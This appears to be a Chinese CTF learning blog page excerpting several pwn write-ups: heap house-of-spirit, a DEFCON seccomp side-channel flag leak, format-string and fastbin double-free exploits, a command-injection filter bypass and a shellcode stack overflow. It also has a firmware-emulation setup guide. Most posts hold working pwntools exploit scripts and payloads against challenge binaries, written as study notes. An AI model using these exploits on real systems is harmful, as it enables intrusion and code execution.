money~\n&quot;, fake_chunk)	io.sendlineafter(&quot;choice : &quot;, &#x27;2&#x27;)				# free(fake_addr)	io.sendlineafter(&quot;choice : &quot;, &#x27;1&#x27;)				# malloc(fake_addr)	io.sendlineafter(&quot;long?&quot;, &#x27;48&#x27;)	payload = b&quot;A&quot; * 0x18	payload += p64(shellcode_addr) 					# overwrite return address	payload = payload.ljust(48, b&#x27;\x00&#x27;)	io.sendafter(&quot;48\n&quot;, payload)def pwn():	io.sendlineafter(&quot;choice&quot;, &#x27;3&#x27;)	io.interactive()leak()house_of_spirit()pwn()



排错​		自己写的exp一直有问题,有一大片后面的选择\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;EASY HOTEL&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n1. check in\n2. check out\n3. goodbye\nyour choice :的输出
​		捣鼓半天是leak那里出问题了..一个回车引发的血案……….草……… 造成了后面一堆的错乱,为啥gdb里不影响呢? 
​		这里要用send,因为存在offbyone,所以不需要回车,可以正好填满缓冲区,然后把rbp打印出来
12345def leak(): 14     global fake_addr,shellcode_addr 15     payload = shellcode.rjust(48,b&#x27;A&#x27;) 16     p.recvuntil(&quot;who are u?\n&quot;) 17     p.send(payload)

​		感觉貌似就算输入48个字符和\n,也不会有影响呀,是影响了后面的东西吗,比如这个\n作为后面的输入了? 是的,是这样
是的,理论上48个字符后,下一个字符,会放到ebp-0x38,也就是刚才输入的who are u后面的前方(不信可以输入49个a试试)
1234.text:0000000000400B1F                 call    sub_4007DF.text:0000000000400B24                 cdqe.text:0000000000400B26                 mov     [rbp+var_38], rax.text:0000000000400B2A                 mov     eax, 0


​	不正常的,不正常是因为\n被give you id读取了,然后65\n和give your money后面全乱了


​		正常的(伪造这个0x41的位置),释放后再申请,前面18个随便填充,然后就覆盖返回地址了

待整理​	感觉貌似就算输入48个字符和\n,也不会有影响呀,是影响了后面的东西吗,比如这个\n作为后面的输入了? 是的,是这样
程序运行起来了,接入pid调试
,或者能不能直接看内存空间
Gdb attach本地进程进去	
搞一搞pwntools,深入理解下
house_of_spirit 也有一个send
你的exp有问题…不过确实可以找一下其他的学一下
​		2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决
https://blog.csdn.net/sinat_35360663/article/details/128510319
后面有个总结不错
一个回车惹的祸…
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/" title="pwn入门-32-defcon2017资格赛-mute">pwn入门-32-defcon2017资格赛-mute</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-06T10:20:11.000Z" title="发表于 2023-06-06 18:20:11">2023-06-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-28T14:42:28.731Z" title="更新于 2023-07-28 22:42:28">2023-07-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		侧信道是个很有意思的东西…万物皆可侧信道…各种奇奇怪怪的方法










https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute
​		好多年前的defcon的题了,但现在来看也并不简单,一方面考察了脑洞,要想到侧信道的办法,另一方面要有比较深厚的计算机基础,比如了解系统调用,会写汇编,对汇编比较熟悉才能写出来exp.
程序分析1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  int v5; // [rsp+14h] [rbp-Ch]  void *buf; // [rsp+18h] [rbp-8h]  v5 = 0;  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);  puts(&quot;SILENCE, FOUL DAEMON!&quot;);  v3 = _bss_start;  fflush(_bss_start);  dropSyscalls(v3);  while ( v5 != 4096 )  &#123;    v3 = 0LL;    v5 += read(0, buf, 4096 - v5);  &#125;  ((void (__fastcall *)(FILE *))buf)(v3);  return 0;&#125;



​		读取一段内容到buf,然后执行读取的内容,很明显,要读取一段shellcode,但是禁用了一些系统调用
123456789101112131415161718192021222324root@VM-24-10-ubuntu:/home/ubuntu/side# seccomp-tools dump ./muteSILENCE, FOUL DAEMON! line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0e 0xffffffff  if (A != 0xffffffff) goto 0019 0005: 0x15 0x0c 0x00 0x00000000  if (A == read) goto 0018 0006: 0x15 0x0b 0x00 0x00000002  if (A == open) goto 0018 0007: 0x15 0x0a 0x00 0x00000003  if (A == close) goto 0018 0008: 0x15 0x09 0x00 0x00000004  if (A == stat) goto 0018 0009: 0x15 0x08 0x00 0x00000005  if (A == fstat) goto 0018 0010: 0x15 0x07 0x00 0x00000006  if (A == lstat) goto 0018 0011: 0x15 0x06 0x00 0x00000007  if (A == poll) goto 0018 0012: 0x15 0x05 0x00 0x00000008  if (A == lseek) goto 0018 0013: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0018 0014: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0018 0015: 0x15 0x02 0x00 0x0000000b  if (A == munmap) goto 0018 0016: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0018 0017: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0019 0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0019: 0x06 0x00 0x00 0x00000000  return KILL

​		诶 不是有execve吗,不能getshell吗
exp​		思路是有的,但是编写exp就比较头疼,汇编比较渣,总之一步步来,先open read然后读每个字节,然后比较,(pwncollege好好打打基础!)
1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;ERROR&#x27;)  # 这个必须加,不然shellcraft没法正确识别指令集flag = &quot;&quot;for i in range(15): # flag的位数,不知道就可以多写点    c = 0  # 存储字符的ascii码    for j in range(8): # 一个字符8位 循环每一位        p = process(&quot;./mute&quot;)        p.readline()         shellcode = shellcraft.open(&quot;./flag&quot;,constants.O_RDONLY,None) # 打开文件        shellcode += pwnlib.shellcraft.amd64.mov(&quot;r8&quot;,&quot;rax&quot;) # 把句柄给r8        shellcode += pwnlib.shellcraft.amd64.lseek(&quot;r8&quot;,i,0) # lseek 读写文件偏移量,这个就是说,一个字节一个字节读,        shellcode += pwnlib.shellcraft.amd64.read(&quot;r8&quot;,&quot;rsp&quot;,1) # 把内容读取1字节,读到rsp上        shellcode += &#x27;&#x27;&#x27;            movzx eax, BYTE PTR [rsp]  #把rsp指向的地址处的要比较的字符读取到al中,0扩展到eax            movsx edx,al    # 把要比较的字符放到edx中            mov eax,%s   #把变量放到eax中,就是循环变量 j ,以此循环每个位,一共8位            mov ecx,eax  # 把变量放到ecx            sar edx,cl   # 右移 cl位            mov eax,edx            and eax,1            test eax,eax # and运算、测试是1还是0            je .L2 # jz的别名,如果是0,跳转L2        .L3:            jmp .L3        .L2:            leave            ret        &#x27;&#x27;&#x27; % j          # 这个是填充%s变量的        shellcode = asm(shellcode)        p.send(shellcode+b&quot;\0&quot;*(0x1000-len(shellcode)))        try:            p.recv(timeout=1)  # 1,移位然后或,把新的一位设置为1            c = (c&gt;&gt;1) | 128   # 0000 0000     1000 0000  f 0x66 0b1100110        except EOFError:   # 0 , leave ret后EOFError            c = c&gt;&gt;1    sys.stdout.write(chr(c))    flag += chr(c)    sys.stdout.flush()print(flag)



汇编分析1234567891011121314151617181920212223242526272829303132333435363738394041/* open(file=&#x27;flag&#x27;, oflag=0, mode=0) */   /* push b&#x27;flag\x00&#x27; */   push 0x67616c66   mov rdi, rsp   xor edx, edx /* 0 */   xor esi, esi /* 0 */   /* call open() */   push SYS_open /* 2 */   pop rax   syscall   mov r8, rax   # 返回值,句柄,   /* lseek(fd=&#x27;r8&#x27;, offset=0, whence=0)  这是第一次,偏移为0*/   mov rdi, r8   xor edx, edx /* 0 */   xor esi, esi /* 0 */   /* call lseek() */   push SYS_lseek /* 8 */   pop rax   syscall   /* call read(&#x27;r8&#x27;, &#x27;rsp&#x27;, 1) */   xor eax, eax /* SYS_read */   mov rdi, r8   push 1   pop rdx   mov rsi, rsp   syscall  # 系统调用号是0 前面xor即可           movzx    eax, BYTE PTR [rsp]           movsx    edx, al           mov    eax, 0           mov    ecx, eax           sar    edx, cl           mov    eax, edx           and    eax, 1           test    eax, eax           je    .L2       .L3:           jmp    .L3       .L2:           leave           ret



调试调试的话,可以直接pwntools+gdb调,也可以写段汇编自己调试
接收字符分析12345try:    p.recv(timeout=1)  # 收到消息了,是1,移位然后或,把新的一位设置为1    c = (c&gt;&gt;1) | 128   # 0000 0000     1000 0000  f 0x66 0b1100110except EOFError:       # 0     c = c&gt;&gt;1



​		以接收f的过程为例, f是 0b01100110 
12345678910root@vultr:~/side# python3 1.py0b00b100000000b110000000b11000000b1100000b100110000b110011000b1100110f

​		上面是直接print(bin(c))打印的每次的输出结果,其实不是很好看,补全后就明朗了,就是每次接收一个字符都会往后移动一位,然后前面的就是新的一位
0b000000000b100000000b110000000b011000000b001100000b100110000b110011000b01100110
​		刚开始一直不明白是0还是1的时候才会接收到消息,也就是说是,leave;ret;会接收到消息,还是一直jmp会接收到消息,现在看结果是一直jmp会接收到消息,这是为什么呢?
​		嘶,感觉其实不是接收到了消息,而是时间到了后,也没有报错,就继续往下执行了,但如果是0的话,就会exit退出,然后EOFError,1的话接收时间过了,就执行下面代码了.
留的小尾巴了解一下怎么调试汇编吧..直接编写汇编代码调试
还没用时间侧信道来做呢…
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/" title="pwn入门-31-DASCTF六月二进制专项-1">pwn入门-31-DASCTF六月二进制专项-1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-05T09:50:57.000Z" title="发表于 2023-06-05 17:50:57">2023-06-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:21.738Z" title="更新于 2023-06-09 20:28:21">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		和哥几个打的这个比赛,虽然只做出了几道题,但是还有几道其实也都差不多了,思路都没问题,还是因为细节的问题,对原理的掌握不够深入导致的问题,还得再好好打基础和巩固.
fooooood​		这道格式化字符串题给自己整的太恶心了..主要是很久不做格式化字符串了,然后当时理解的没那么深入,有些小问题就卡死了…
​		非栈上的格式化字符串利用, 看到一种方法是可以利用栈上已有的指针,当时也用了,不过不知道为什么利用格式化字符串写数据的时候有问题….回头再专门学一下
​		这是一条可以利用的链
​		感觉自己的思路是没有问题的,但是对格式化字符串的一些利用的小点不是很熟悉,就导致了问题
​		

exp​		主要分了几部分,先把for循环的i改大一点,因为要循环很多次,然后还要地址泄露,再之后呢,写一个格式化字符串的替换函数,把返回地址修改了就可以了
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)libc = ELF(&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)io = process(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io)io.recvuntil(&quot;Give me your name:&quot;)io.sendline(&quot;test&quot;)io.recvuntil(&quot;favourite food: &quot;)io.sendline(&quot;%11$p&quot;)io.recvuntil(&quot;You like &quot;)#data = (io.recvline().strip()).decode().split(&#x27;.&#x27;)rsp = int(io.recvuntil(&#x27;!?&#x27;)[:-2],16)-248print(hex(rsp))i = rsp+4i_off = i&amp;0xffffprint(hex(i_off))payload = b&#x27;%&#x27;+str(i_off).encode()+b&#x27;c%11$hn&#x27;print(payload)io.sendlineafter(&#x27;food: &#x27;,payload)payload = b&#x27;%&#x27;+str(40).encode()+b&#x27;c%37$hhn&#x27;sleep(1)io.sendlineafter(&#x27;food: &#x27;,payload)# 泄露libcpayload = b&#x27;%9$p&#x27;io.sendlineafter(&#x27;food: &#x27;,payload)io.recvuntil(&quot;You like &quot;)libc.address = int(io.recvuntil(&#x27;!?&#x27;)[:-2],16) - 240- libc.sym.__libc_start_main#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述 （1）与（2）两个栈地址在格式化字符串中的偏移def overlap(dest,ptr,off1,off2):    d = dest&amp;0xff    for i in range(8):        if not ptr:            break        payload=b&#x27;%&#x27;+str(d).encode()+b&#x27;c%&#x27;+str(off1).encode()+b&#x27;$hhn&#x27;        io.sendlineafter(&#x27;food: &#x27;,payload)        f=ptr&amp;0xff        payload=b&#x27;%&#x27;+str(f).encode()+b&#x27;c%&#x27;+str(off2).encode()+b&#x27;$hhn&#x27;        io.sendlineafter(&#x27;food: &#x27;,payload)        d+=1        ptr&gt;&gt;=8ret=rsp+0x18ptr=libc.address+0x21112payload = b&#x27;%&#x27;+str(ret&amp;0xffff).encode()+b&#x27;c%&#x27;+str(25).encode()+b&#x27;$hn&#x27;io.sendlineafter(&#x27;food: &#x27;,payload)pause()# 覆盖返回地址overlap(ret,ptr,25,39)overlap(ret+8,libc.search(b&#x27;/bin/sh&#x27;).__next__(),25,39)overlap(ret+16,libc.sym.system,25,39)io.sendlineafter(&#x27;food: &#x27;,payload)io.interactive()



​		自己之前的exp..回头检查下是哪的问题
12345678910111213141516171819202122232425262728293031323334353637from pwn import *context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)mylibc = ELF(&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)io = process(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io)io.recvuntil(&quot;Give me your name:&quot;)io.sendline(&quot;test&quot;)io.recvuntil(&quot;favourite food: &quot;)io.sendline(&quot;%31$p.%21$p&quot;)io.recvuntil(&quot;You like &quot;)data = (io.recvline().strip()).decode().split(&#x27;.&#x27;)print(data)#pause()#libc_addr = int(data[3],16)-0x20840first_addr = int(data[0],16)print(hex(first_addr))#pause()#print(hex(libc_addr))#print(hex(ret_addr))#onegadget = libc_addr + 0x45226#pause()payload = fmtstr_payload(31,&#123;0x7fffff:0x7fffff&#125;)print(payload)#payload = b&quot;%58248c%31$n&quot;payload = b&quot;%.26204x%30$n&quot;#pause()io.recvuntil(&quot;favourite food: &quot;)io.sendline(payload)io.recvuntil(&quot;You like &quot;)pause()io.interactive()



​		存储备忘的信息
%10$p.%15$p.aaa
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x1ffffe540.0xc144e077e3cf5200.0x555555554b60.0x7ffff7a2d840.(nil).37
为什么不按顺序了…
0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x3ffffe540.0xb1fb67251108900.0x555555554b60.0x7ffff7a2d840.(nil).0x7fffffffe548test’
%12$p.%13$p.%14$p.%15$p.aaa
0x1f7ffcca0.0x555555554a67.(nil).0x7da3d3a4544d517e.aaa37
%16$p.%17$p.%18$p.%19$p.aaa
x555555554820.0x7fffffffe540.(nil).(nil).aaa
%20$p.%21$p.%22$p.%23$p.aaa
0x4f7197cdb841edfc.0x4f718777df51edfc.(nil).(nil).aaa
%24$p.%25$p.%26$p.%27$p.aaa
(nil).0x7fffffffe558.0x7ffff7ffe168.0x7ffff7de780b.aaa
%28$p.%29$p.%30$p.%31$p.aaa
(nil).(nil).0x555555554820.0x7fffffffe540.aaa
%32$p.%33$p.%34$p.%35$p.aaa
(nil).0x555555554849.0x7fffffffe538.0x1c.aaa
%36$p.%37$p.%38$p.%39$p.aaa
0x1.0x7fffffffe79c.(nil).0x7fffffffe7ba.aaa
0x7fffffffe388
0xffffe388
0xe388
11个位置 -0xd0
https://blog.csdn.net/qq_52877079/article/details/129756543
https://www.anquanke.com/post/id/184717
easynote​		简单的一道菜单堆题,看的时候很眼熟很眼熟,果然是之前做过的,只是稍微改动
​		https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/
​		开启了pie,那就用largebin smallbin的main_arena来泄露地址,
​		这里有个小坑,就是接收返回地址的时候一直接收不到,注意这是因为先接收到了\n,用recv应该是接收到\n为止? 所以可以用多个recv或者recvuntil,
​		malloc有检测,回头分析源码的时候可以具体看看
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *elf = &quot;./pwn&quot;context.log_level= &quot;debug&quot;p = process(elf)#p = remote(&quot;node4.buuoj.cn&quot;,25350)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)def add(size,content):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;The length of your content ---&gt;&#x27;, str(size))    p.sendlineafter(&#x27;Content ---&gt;&#x27;, content)def edit(index, size,content):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Index ---&gt;&#x27;, str(index))    p.sendlineafter(&#x27;The length of your content ---&gt;&#x27;, str(size))    p.sendlineafter(&#x27;Content ---&gt;&#x27;, content)def show(index):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;4&#x27;)    p.sendlineafter(&#x27;Index ---&gt;&#x27;, str(index))def delete(index):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;3&#x27;)    p.sendlineafter(&#x27;Index ---&gt;&#x27;, str(index))add(0x30,&quot;aaa&quot;)add(0x30,&quot;bbb&quot;)delete(0)delete(1)delete(0)add(0x50,&quot;xielu&quot;)add(0x100,&quot;dizhi&quot;) # 3 泄露地址用add(0x50,&quot;hebing&quot;) # 防止合并delete(3)show(3)p.recvuntil(&quot;Content: &quot;)libc_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;)) - 0x3c4b78print(hex(libc_addr))# fastbin double free修改add(0x30,p64(0x602022))add(0x30,&quot;a&quot;)add(0x30,&quot;b&quot;)#pause()add(0x30,b&quot;\x40\x00\x00\x00\x00\x00&quot;+p64(libc_addr+0x4527a))p.interactive()



server​		当时做的时候没想到栈的重叠的问题,单纯过滤肯定是没戏的.咋说捏,只会一些传统的套路是不行的,那只是基础,要在此之上更上一个纬度,看清事物的本质,学会变通才能应对更复杂的情况.
​		对此题的反思就是,首先还是基础,要打好基础,打好操作系统原理的基础,如果懂这个的话,估计其实很容易想到重叠的问题.然后再培养细心以及一些自动化工具帮你寻找类似的点.
思路一​		access校验的长度有限,为32
1234567snprintf(name, 0x20uLL, &quot;/keys/%s.key&quot;, s);这个长度是27,加上/keys就是32了../../../../../././bin/sh #    /keys/../../../../../././bin/sh 最后access的是这个文件,肯定是存在的

​		
​		然后就是命令拼接了,存在未初始化漏洞,栈上有残留数据
​		第二次输入个单引号就好了, \n也可以作为命令分隔符,所以前面那个add_user -u ‘’就是没用的了,直接执行后面的&#x2F;bin&#x2F;sh了
​		过滤 ; &amp; &#96; | $ 空格 ( ) {} - &#x2F; \
​		这个不用写脚本,
123456789101112第一次选1,输入../../../../../././bin/sh #然后选2,输入&#x27;然后就闭合了,就可以getshell了    &quot;add_user -u &#x27;%s&#x27; -p &#x27;888888&#x27;&quot;        ► 0x555555555748    call   system@plt                &lt;system@plt&gt;        command: 0x7fffffffe410 ◂— &quot;add_user -u &#x27;&#x27;\n/bin/sh #&#x27; -p &#x27;888888&#x27;&quot;



思路二1&#x27;\ncat\tfl*\n

​		这里也用到覆盖了,看exp就可以理解了,exp的12就是随便输入的,后面的’\n会替代
​				过滤的空格可以用\t替代
12345678910111213141516171819202122232425262728293031from pwn import *elf = &quot;./pwn_7&quot;context.log_level= &quot;debug&quot;p = process(elf)#p =remote(&quot;node4.buuoj.cn&quot;, 25471)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)p.recvuntil(&quot;Your choice &gt;&gt;&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Please input the key of admin : &quot;)p.sendline(b&quot;../../../../../../../../../&quot;)print(p.recv())p.recvuntil(&quot;Your choice &gt;&gt;&quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Please input the username to add :&quot;)payload = b&quot;xxcat\tfl*\n&quot;p.sendline(payload)p.recv(1024)p.recv(1024)p.recvuntil(&quot;Your choice &gt;&gt;&quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Please input the username to add :&quot;)payload = b&quot;&#x27;&quot;p.sendline(payload)print(p.recv(1024))print(p.recv(1024))p.interactive()

​		 能不能’cat\tfl*\n呢,不能呀,,需要有个\n,但是没有,也没有; 没有分隔符没办法执行两条命令,这个必须要\n的 \t不行吗,不行…….
https://blog.51cto.com/u_15400016/4287727
https://www.secpulse.com/archives/96374.html
问题用recv应该是接收到\n为止? 所
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/" title="固件模拟工具firmae安装">固件模拟工具firmae安装</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-03T12:09:40.000Z" title="发表于 2023-06-03 20:09:40">2023-06-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:29:53.177Z" title="更新于 2023-06-09 20:29:53">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/IOT/">IOT</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a></span></div><div class="content">​		因为最近在做iot相关的漏洞复现,搭建环境是很重要的一环,qemu可以直接搭建,但有时候一些细节会导致一些问题,所以firmae是一个集成化的工具,可以帮助一键搭建环境.
​		但是安装这个工具的时候..又发生了奇奇怪怪的问题…记录一下.. 搞计算机遇到报错太正常了,但同样也是非常搞人心态的,学会如何排错,如何利用搜索引擎(包含chatgpt!)来解决问题是很重要的一个能力!
​		有一说一,能真机还是最好别虚拟… 当然没有那么多钱、也不一定能买到,虚拟也是不错的
工具地址:https://github.com/pr0v3rbs/FirmAE
搭建环境:ubuntu18
123git clone --recursive https://github.com/pr0v3rbs/FirmAE./download.sh               # 就是一个下载脚本,单纯的download..(国内服务器买香港的,或者用国外的..或者..../install.sh

​		然后报错了…一堆红…
​		其实如果不确定是哪里报错了,可以拆看sh脚本,一点一点执行,看看
​		报错:
1234./psycopg/psycopg.h:35:10: fatal error: Python.h: No such file or directory   #include &lt;Python.h&gt;            ^~~~~~~~~~  compilation terminated.

解决方案:https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory
​		其实不解决貌似后面也能搭建起来,好像是一路畅通,但运行起来还是显示不了页面等,肯定有问题,所以还是要解决的.
1sudo apt-get install python3-dev

​		运行完后重新跑一遍install脚本,出现这个,一路输入y
1Reversed (or previously applied) patch detected!  Assume -R? [n]



​		开始模拟
123./init.shwget https://github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip





123456root@VM-0-9-ubuntu:/home/ubuntu/FirmAE# ./run.sh -r tenda DIR868L_B1_FW205WWb02.bin[*] DIR868L_B1_FW205WWb02.bin emulation start!!!Traceback (most recent call last):  File &quot;./sources/extractor/extractor.py&quot;, line 19, in &lt;module&gt;    import binwalkModuleNotFoundError: No module named &#x27;binwalk&#x27;



​		不能直接pip3 install binwalk! 也不能apt install binwalk!!!!
​		参考:https://www.secpulse.com/archives/201139.html
​		可以观察到它目录下有binwalk这个目录,cd进去后 python3 setup.py install

​		解压固件要用这个命令 (github上也没说啊!!!!)
1binwalk -Me xxxx.bin --run-as=root

​		然后再run就可以了(有时候环境比较复杂,不知道哪个开的有影响,采用重启大法! 重启后init,然后run)

​		由于模拟环境是在云服务器上上的内网网卡,公网无法直接访问,需要做个端口转发,
​		gost:https://github.com/ginuerzh/gost
​		gzip -d 解压
1gost -L=tcp://:2222/192.168.0.2:80

​		然后就可以访问了!!!

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/" title="pwn入门-30-2023OUC校赛">pwn入门-30-2023OUC校赛</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-03T08:18:00.000Z" title="发表于 2023-06-03 16:18:00">2023-06-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:17.721Z" title="更新于 2023-06-09 20:28:17">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		拖了挺久才整理…不应该…以后要及时复盘. 本身题不是很难,不过有很多小细节,自己之前没弄懂,还是说有时间的话,多研究研究,以及之前的题,要进行一定的复盘.
恢复符号​		比较恶心的一个点(其实也不恶心,就是自己之前没弄过),找到了一些文章,然后github有编译好的符号文件,可以直接ida导入就好了,回头有时间可以自己编译一下
​		https://github.com/maroueneboubakri/lscan
​		https://blog.csdn.net/Breeze_CAT/article/details/103788796
​		ida中shift+f5,然后把符号文件添加进去
​		还有就是一些地址的计算…头大,,(估计还是原理没完全搞明白)
pwn1​		栈长度是0x68 &#x3D; 104,但能读取256,很明显的栈溢出,可以覆盖返回地址,而且没有开NX保护,可以写shellcode,于是问题就变成了怎么跳到shellcode呢,或者怎么知道shellcode的地址,puts的话,遇到\x00才会停止所以可以前面填满,然后输出ebp这里的值,这里的值好像会有一些变化,所以可以不用太具体,前面一直加nop就好了,跳到nop然后走,然后shellcode
121d:0074│     0xffffd4f4 ◂— 0x01e:0078│ ebp 0xffffd4f8 —▸ 0xffffd508 ◂— 0x0

​		ebp和esp差了0x90 esp和ecx(开始输出字符串那里)差了0x28,ebp输出的值和ebp差了0xbe,这样有点乱,画图会清晰很多


​		这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究,可以简单的跳到这个位置就好了,加一些nop(但是打远程的时候不知道为什么老不成功,可以加一点偏移,因为毕竟是往前跳)
​		有system有&#x2F;bin&#x2F;sh 能不能rop呢?
p32(addr-0xbe+0x2e+0x28)
​		
​		换句话说,ebp这个位置的值如果正好位于 [ebp-0x68,ebp-len(shellcode)]之间的话,就正好到了nop,如果大的话,就需要我们来加一点值了
12345678910111213141516171819202122232425262728##!/usr/bin/env pythonfrom pwn import *#sh = process(&#x27;./pwn1&#x27;)sh = remote(&quot;101.43.247.245&quot;,9200)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x80488F2&quot;)#gdb.attach(sh)sh.recvuntil(b&quot;say&quot;)sh.sendline(b&quot;a&quot;*0x68)#addr = u32(sh.recv(8)[4:8])sh.recv(0x68)addr = u32(sh.recv(4))shellcode = asm(shellcraft.sh())nop = asm(&#x27;&#x27;&#x27;        nop        &#x27;&#x27;&#x27;)shellcode = nop*30+shellcodepayload = shellcode.ljust(0x68, b&#x27;b&#x27;) + p32(0)+p32(addr+0xbe-0x78+0x10-4)print(hex(addr))print(hex(addr+0xbe-0x90+0x28+4))sh.sendline(payload)sh.interactive()





